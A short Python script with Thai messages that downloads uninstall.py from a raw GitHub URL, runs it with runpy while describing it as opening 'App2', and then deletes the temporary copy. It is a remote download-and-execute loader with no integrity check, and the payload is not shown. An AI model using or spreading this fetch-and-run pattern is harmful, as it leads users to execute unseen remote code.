import urllib.request
import urllib.error
import tempfile
import os
import runpy
import socket

URL = "https://raw.githubusercontent.com/suriwrrnkulchang-art/55/main/uninstall.py"

TEMP_FILE = os.path.join(tempfile.gettempdir(), "uninstall.py")

socket.setdefaulttimeout(10)

try:
    print("กำลังดาวน์โหลด App2...")

    urllib.request.urlretrieve(URL, TEMP_FILE)

    if not os.path.exists(TEMP_FILE):
        raise Exception("ดาวน์โหลดไฟล์ไม่สำเร็จ")

    if os.path.getsize(TEMP_FILE) == 0:
        raise Exception("ไฟล์ว่าง")

    print("กำลังเปิดโปรแกรม...")

    runpy.run_path(TEMP_FILE, run_name="__main__")

except urllib.error.URLError:
    print("ไม่สามารถเชื่อมต่ออินเทอร์เน็ตได้")

except Exception as e:
    print("เกิดข้อผิดพลาด:", e)

finally:
    if os.path.exists(TEMP_FILE):
        try:
            os.remove(TEMP_FILE)
        except Exception:
            pass
